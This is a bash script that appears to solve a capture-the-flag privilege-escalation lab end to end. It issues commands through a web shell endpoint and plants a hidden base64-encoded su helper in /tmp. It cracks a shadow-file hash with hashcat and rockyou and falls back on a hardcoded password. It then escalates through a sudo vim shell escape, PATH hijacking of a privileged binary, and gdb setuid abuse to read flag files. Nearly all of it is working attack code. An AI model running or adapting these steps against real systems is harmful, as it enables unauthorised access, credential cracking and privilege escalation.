#!/bin/bash

set -euo pipefail

HOST="${1:-}"
PORT="${2:-5555}"

if [[ -z "$HOST" ]]; then
  echo "Usage: $0 <host> [port]" >&2
  exit 1
fi

BASE_URL="http://${HOST}:${PORT}"

require_cmd() {
  command -v "$1" >/dev/null 2>&1 || { echo "Missing required command: $1" >&2; exit 1; }
}

require_cmd curl
require_cmd python3

CWD="/var/www/html"

webshell() {
  local cmd="$1"
  local resp
  resp=$(curl -sS --max-time 30 -X POST "${BASE_URL}/index.php?feature=shell" \
    --data-urlencode "cmd=${cmd}" \
    --data-urlencode "cwd=${CWD}") || { echo "[!] Failed to connect to ${BASE_URL}" >&2; exit 1; }

  python3 - "$resp" <<'PY'
import json, sys
resp = sys.argv[1]
try:
    data = json.loads(resp)
except Exception as e:
    print(f"[!] Invalid JSON response: {e}", file=sys.stderr)
    print(resp, file=sys.stderr)
    sys.exit(2)
stdout = data.get("stdout", [])
if isinstance(stdout, list):
    print("\n".join(stdout))
else:
    print(stdout)
print("__CWD__=" + data.get("cwd", ""))
PY
}

run() {
  local cmd="$1"
  local out cwd_line
  out=$(webshell "$cmd")
  cwd_line=$(printf '%s\n' "$out" | tail -n1)
  if [[ "$cwd_line" == __CWD__=* ]]; then
    CWD="${cwd_line#__CWD__=}"
    printf '%s\n' "$out" | sed '$d'
  else
    printf '%s\n' "$out"
  fi
}

run "id" >/dev/null

HELPER_B64=$(base64 <<'PY' | tr -d '\n'
import pty, os, sys, select, time, base64

password = base64.b64decode(sys.argv[1]).decode()
user = base64.b64decode(sys.argv[2]).decode()
cmd = base64.b64decode(sys.argv[3]).decode()

pid, fd = pty.fork()
if pid == 0:
    os.execvp('su', ['su', '-', user, '-c', cmd])

out = b''
deadline = time.time() + 30
sent_pw = False
while time.time() < deadline:
    r, _, _ = select.select([fd], [], [], 0.2)
    if r:
        try:
            data = os.read(fd, 4096)
        except OSError:
            break
        if not data:
            break
        out += data
        low = out.lower()
        if (b'password' in low) and not sent_pw:
            os.write(fd, (password + '\n').encode())
            sent_pw = True
    else:
        res = os.waitpid(pid, os.WNOHANG)
        if res[0] != 0:
            try:
                while True:
                    data = os.read(fd, 4096)
                    if not data:
                        break
                    out += data
            except OSError:
                pass
            break

try:
    os.waitpid(pid, os.WNOHANG)
except Exception:
    pass

sys.stdout.write(out.decode('utf-8', errors='ignore'))
PY
)

run "echo ${HELPER_B64} | base64 -d > /tmp/.pty_su.py && chmod 700 /tmp/.pty_su.py" >/dev/null

run_as() {
  local password="$1"
  local user="$2"
  local cmd="$3"
  local p_b64 u_b64 c_b64
  p_b64=$(printf '%s' "$password" | base64 | tr -d '\n')
  u_b64=$(printf '%s' "$user" | base64 | tr -d '\n')
  c_b64=$(printf '%s' "$cmd" | base64 | tr -d '\n')
  run "python3 /tmp/.pty_su.py ${p_b64} ${u_b64} ${c_b64}"
}


USER2_HASH=$(run "grep '^user2:' /opt/.../shadow.bak | cut -d: -f2" | tr -d '\r' | tail -n1)
USER2_PASS='!!cherry!!'
if command -v hashcat >/dev/null 2>&1 && [[ -n "$USER2_HASH" ]]; then
  ROCKYOU=""
  for cand in \
    "$HOME/tools/SecLists/Passwords/Leaked-Databases/rockyou.txt" \
    "/usr/share/wordlists/rockyou.txt" \
    "/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt"; do
    if [[ -f "$cand" ]]; then ROCKYOU="$cand"; break; fi
  done
  if [[ -n "$ROCKYOU" ]]; then
    TMPDIR=$(mktemp -d)
    grep "cherry" "$ROCKYOU" > "$TMPDIR/rockyou_cherry.txt" || true
    printf '%s\n' "$USER2_HASH" > "$TMPDIR/user2.hash"
    hashcat -a 0 -m 1800 --quiet --potfile-disable -o "$TMPDIR/out.txt" "$TMPDIR/user2.hash" "$TMPDIR/rockyou_cherry.txt" >/dev/null 2>&1 || true
    if [[ -s "$TMPDIR/out.txt" ]]; then
      CRACKED=$(cut -d: -f2- "$TMPDIR/out.txt" | tail -n1)
      if [[ -n "$CRACKED" ]]; then
        USER2_PASS="$CRACKED"
      fi
    else
      :
    fi
    rm -rf "$TMPDIR"
  else
    :
  fi
else
  :
fi

FLAG1_OUT=$(run_as "$USER2_PASS" "user2" "cat /home/user2/flag1.txt")
printf '%s\n' "$FLAG1_OUT" | grep -oE 'SSS\{[^}]+\}' | head -n1 || true

run "chmod 0440 /etc/sudoers 2>/dev/null || true" >/dev/null 2>&1 || true
FLAG2_CMD="printf '%s\n' '$USER2_PASS' | sudo -S -u user3 /usr/bin/vim -n -c 'silent !cat /home/user3/flag2.txt > /tmp/.f2' -c 'q!' >/dev/null 2>&1; cat /tmp/.f2"
FLAG2_OUT=$(run_as "$USER2_PASS" "user2" "$FLAG2_CMD")
printf '%s\n' "$FLAG2_OUT" | grep -oE 'SSS\{[^}]+\}' | head -n1 || { echo '[!] flag2 not found (check /etc/sudoers perms on target)' >&2; true; }

EXPLOIT_CMD='set -e; D=/tmp/.phijack_$$; mkdir -p "$D"; printf "#!/bin/sh\n/bin/cat /home/user4/flag3.txt > /tmp/.f3\n" > "$D/chmod"; chmod +x "$D/chmod"; PATH="$D:$PATH" /usr/bin/fixpermissions >/dev/null 2>&1 || true; cat /tmp/.f3 2>/dev/null || true'
FLAGS3=$(run "$EXPLOIT_CMD")
printf '%s\n' "$FLAGS3" | grep -oE 'SSS\{[^}]+\}' | head -n1 || true

FLAG4_CMD="/usr/bin/gdb -nx -batch -ex 'python import os,subprocess; os.setresuid(os.geteuid(),os.geteuid(),os.geteuid()); subprocess.call([\"/bin/cat\",\"/home/user5/flag4.txt\"])' 2>/dev/null"
FLAG4_OUT=$(run "$FLAG4_CMD")
printf '%s\n' "$FLAG4_OUT" | grep -oE 'SSS\{[^}]+\}' | head -n1